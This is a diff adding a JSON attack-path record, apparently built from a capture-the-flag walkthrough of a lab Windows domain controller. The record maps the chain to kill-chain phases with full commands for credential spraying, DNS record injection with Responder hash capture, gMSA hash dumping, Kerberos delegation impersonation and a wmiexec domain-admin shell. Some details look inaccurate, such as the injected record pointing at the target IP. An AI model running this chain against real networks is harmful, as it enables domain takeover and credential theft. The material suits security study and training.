@@ -1,0 +1,279 @@
+{
+  "id": "ap-0009",
+  "title": "Privilege Escalation: GMSA Password Read via IT Support Group -> Constrained Delegation Abuse",
+  "summary": "Initial access gained by analyzing filtered documents for default credentials. Lateral movement achieved by intercepting scheduled task credentials via DNS injection. Final privilege escalation compromises a Group Managed Service Account (GMSA) and abuses Kerberos constrained delegation (S4U2P) to gain Domain Administrator privileges.",
+  "attack_path_markdown": "### Step 1: Initial Recon\nPerform port scanning and service enumeration, identifying the target as a Windows Domain Controller running services like HTTP, Kerberos, LDAP, and SMB [1-5].\n### Step 2: User and Credential Discovery\nAnalyze documents retrieved from the web server by iterating through potential date formats [6, 7]. Extract potential user names from PDF file metadata using tools like `exiftool` [8-10]. Convert PDF content to text using `pdf-to-text` to find default credentials, resulting in the password `New_Intelligent_CorpUser9876` [11, 12].\n### Step 3: Initial Access\nValidate credentials against SMB using `crackmapexec`, confirming the user `tiffany.molina` [13, 14]. Use `smbmap` with these valid credentials to enumerate shared resources and retrieve the `user.txt` flag from the user's directory [15-17].\n### Step 4: Lateral Movement Preparation\nDiscover and analyze the `dns_detector.ps1` script in the `IT` share, noting it runs periodically (every five minutes) and performs an `Invoke-WebRequest` to DNS records starting with 'web' using default credentials [18-20].\n### Step 5: Credential Capture\nUse `dnstool.py` with `tiffany.molina`'s credentials to inject a malicious DNS A record (e.g., `web_savi`) pointing to the attacker's IP [21, 22]. Run `Responder` to listen for the NTLMv2 hash transmitted when the scheduled task executes, capturing the hash for user `ted.grace` [23-25]. Crack the hash, obtaining the password `MisterTeddy` [25, 26].\n### Step 6: Privilege Enumeration\nUse BloodHound Python with `ted.grace`'s credentials to map the Active Directory environment [27, 28]. Identify that `ted.grace`, a member of the `IT Support` group, holds the `ReadGMSAPassword` privilege over the `svc_int` Group Managed Service Account (GMSA) [29, 30].\n### Step 7: Final Privilege Escalation (Delegation Abuse)\nUse `gMSA_dumper.py` to extract the NTLM hash for the `svc_int$` GMSA account, exploiting the `ReadGMSAPassword` privilege [31, 32]. Synchronize the system clock using `ntpdate` for Kerberos attacks [33]. Use `getST.py` with the GMSA hash to perform constrained delegation abuse (S4U2P) and request a service ticket (ST) impersonating the Domain Administrator [34, 35]. Export the resulting ticket (`Administrator.ccache`) to the `KRB5CCNAME` environment variable [36]. Finally, use `wmiexec.py` with Kerberos authentication (`-k`) to gain a shell as the Domain Administrator on the Domain Controller [37, 38].",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial scanning, OS fingerprinting, service enumeration, and collection of potential user lists via document analysis.",
+      "actions": [
+        "Scan all TCP ports and run service version checks",
+        "Perform OS fingerprinting",
+        "Update local hosts file",
+        "Extract potential users from PDF metadata"
+      ],
+      "tools": [
+        "nmap",
+        "Python script (OS check)",
+        "WhatWeb",
+        "Wget",
+        "Exiftool"
+      ],
+      "techniques": [
+        "Active Scanning",
+        "OS Fingerprinting",
+        "File Metadata Analysis"
+      ],
+      "mitre_ids": [
+        "T1595",
+        "T1589"
+      ],
+      "indicators": [
+        "TCP ports 80, 88, 139, 445 open",
+        "Windows OS detected",
+        "List of document authors/creators"
+      ],
+      "preconditions": "Network connectivity to target.",
+      "expected_outcome": "Identification of Domain Controller and potential user names.",
+      "confidence": 1.0,
+      "commands": [
+        "nmap -p- -T5 --min-rate 5000 -Pn -n -vvv 10.10.10.248 -oG all_ports [3, 39, 40]",
+        "nmap -A -p[ports] 10.10.10.248 -oA total_nmap [4]",
+        "echo '10.10.10.248 intelligence.htb' >> /etc/hosts [41]",
+        "for file in *.pdf; do exiftool $file | grep 'Creator'; done [9]"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of initial user authentication and setup of Responder listener and DNS injection tool.",
+      "actions": [
+        "Convert PDF files to text to discover default credentials",
+        "Validate user credentials",
+        "Set up Responder listener"
+      ],
+      "tools": [
+        "pdf-to-text",
+        "crackmapexec",
+        "smbmap",
+        "Responder",
+        "dnstool.py"
+      ],
+      "techniques": [
+        "Credentials in Files",
+        "Initial Credential Validation",
+        "NTLM Hash Capture Preparation"
+      ],
+      "mitre_ids": [
+        "T1552.001"
+      ],
+      "indicators": [
+        "Default password found",
+        "Valid user confirmed (`tiffany.molina`)",
+        "Responder initialized on interface"
+      ],
+      "preconditions": "List of potential users and documents.",
+      "expected_outcome": "Valid domain user credentials and Responder listening.",
+      "confidence": 1.0,
+      "commands": [
+        "pdf-to-text [file.pdf] [11]",
+        "crackmapexec smb 10.10.10.248 -u users.txt -p 'New_Intelligent_CorpUser9876' [13]",
+        "responder -I tun0 [24]"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Injection of a malicious DNS record to force the target system to authenticate to the attacker's listener.",
+      "actions": [
+        "Analyze shared PowerShell script behavior",
+        "Inject DNS A record pointing to attacker IP"
+      ],
+      "tools": [
+        "smbmap",
+        "dnstool.py"
+      ],
+      "techniques": [
+        "Scheduled Task Analysis",
+        "DNS Record Modification"
+      ],
+      "mitre_ids": [
+        "T1053.005"
+      ],
+      "indicators": [
+        "PowerShell script logic understood (web* records, default credentials)",
+        "DNS record injected successfully"
+      ],
+      "preconditions": "Valid user credentials and knowledge of script logic.",
+      "expected_outcome": "Triggering of NTLM hash transmission upon script execution.",
+      "confidence": 1.0,
+      "commands": [
+        "smbmap -u tiffany.molina -p 'New_Intelligent_CorpUser9876' -r IT 10.10.10.248 [18]",
+        "python3 dnstool.py -u tiffany.molina -p 'New_Intelligent_CorpUser9876' -r web_savi -a add -d intelligence.htb 10.10.10.248 [21, 22]"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Cracking the captured NTLMv2 hash, followed by advanced Active Directory enumeration using BloodHound to find GMSA delegation abuse path.",
+      "actions": [
+        "Crack NTLMv2 hash",
+        "Run BloodHound enumeration using new user credentials",
+        "Extract GMSA account hash (`svc_int$`) by exploiting `ReadGMSAPassword` privilege"
+      ],
+      "tools": [
+        "john",
+        "bloodhound.py",
+        "gMSA_dumper.py"
+      ],
+      "techniques": [
+        "Password Cracking",
+        "GMSA Compromise",
+        "Active Directory Enumeration"
+      ],
+      "mitre_ids": [
+        "T1110.002",
+        "T1558.002"
+      ],
+      "indicators": [
+        "Password for `ted.grace` found (`MisterTeddy`)",
+        "GMSA NTLM hash obtained"
+      ],
+      "preconditions": "Captured NTLMv2 hash.",
+      "expected_outcome": "GMSA account hash extracted.",
+      "confidence": 1.0,
+      "commands": [
+        "john --wordlist=rockyou.txt hashes.txt [25]",
+        "python3 bloodhound.py -c All -u ted.grace -p 'MisterTeddy' -ns 10.10.10.248 -d intelligence.htb [27, 28]",
+        "python3 gmsa_dumper.py -u ted.grace -p 'MisterTeddy' -l 10.10.10.248 -d intelligence.htb [31, 32]"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Generating a high-privilege Kerberos ticket for persistence and subsequent actions.",
+      "actions": [
+        "Synchronize time with the Domain Controller",
+        "Generate a Kerberos Service Ticket (ST) impersonating Administrator using GMSA hash (S4U2P)"
+      ],
+      "tools": [
+        "ntpdate",
+        "getST.py"
+      ],
+      "techniques": [
+        "S4U2P Kerberos Delegation Abuse",
+        "Time Synchronization"
+      ],
+      "mitre_ids": [
+        "T1558.002"
+      ],
+      "indicators": [
+        "Clock synchronized",
+        "Kerberos ticket (`Administrator.ccache`) generated"
+      ],
+      "preconditions": "GMSA NTLM hash and target SPN known.",
+      "expected_outcome": "Kerberos ticket cache file ready for privileged execution.",
+      "confidence": 1.0,
+      "commands": [
+        "ntpdate 10.10.10.248 [33]",
+        "python3 getST.py intelligence.htb/svc_int$ -hashes :[GMSA NTLM Hash] -impersonate Administrator -spn http/dc.intelligence.htb [35]",
+        "export KRB5CCNAME=Administrator.ccache [36]"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Establishing a remote shell using the acquired Kerberos ticket via WMI.",
+      "actions": [
+        "Execute WMI commands with Kerberos ticket"
+      ],
+      "tools": [
+        "wmiexec.py"
+      ],
+      "techniques": [
+        "WMI"
+      ],
+      "mitre_ids": [
+        "T1047"
+      ],
+      "indicators": [
+        "Remote shell access obtained as Domain Administrator"
+      ],
+      "preconditions": "Kerberos ticket exported to `KRB5CCNAME` variable.",
+      "expected_outcome": "Interactive command shell on the Domain Controller.",
+      "confidence": 1.0,
+      "commands": [
+        "wmiexec.py -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb [37, 38]"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving Domain Administrator privileges and retrieving the root flag.",
+      "actions": [
+        "Retrieve the final flag (`root.txt`)"
+      ],
+      "tools": [],
+      "techniques": [
+        "Remote File Access"
+      ],
+      "mitre_ids": [
+        "T1483"
+      ],
+      "indicators": [
+        "Root flag retrieved"
+      ],
+      "preconditions": "System access as Administrator.",
+      "expected_outcome": "Full compromise of the target system.",
+      "confidence": 1.0,
+      "commands": [
+        "type \\users\\Administrator\\Desktop\\root.txt (Inferred)"
+      ]
+    }
+  ],
+  "tactics": [
+    "Reconnaissance",
+    "Credential Access",
+    "Discovery",
+    "Lateral Movement",
+    "Privilege Escalation",
+    "Command and Control",
+    "Collection"
+  ],
+  "techniques": [
+    "File Metadata Analysis",
+    "DNS Record Modification",
+    "NTLM Hash Capture",
+    "S4U2P Delegation Abuse",
+    "WMI Execution"
+  ],
+  "mitre_ids": [
+    "T1552.001",
+    "T1558.002",
+    "T1053.005",
+    "T1110.002",
+    "T1047"
+  ],
+  "hosts": [
+    "10.10.10.248",
+    "dc.intelligence.htb"
+  ],
+  "privs_obtained": [
+    "Domain User (tiffany.molina)",
+    "Domain User (ted.grace)",
+    "Domain Administrator"
+  ],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "Complex Active Directory attack path involving scheduled task exploitation and Kerberos delegation abuse.",
+  "labels": [
+    "attack_path",
+    "active_directory",
+    "windows",
+    "kerberos",
+    "gmsa",
+    "delegation"
+  ]
+}
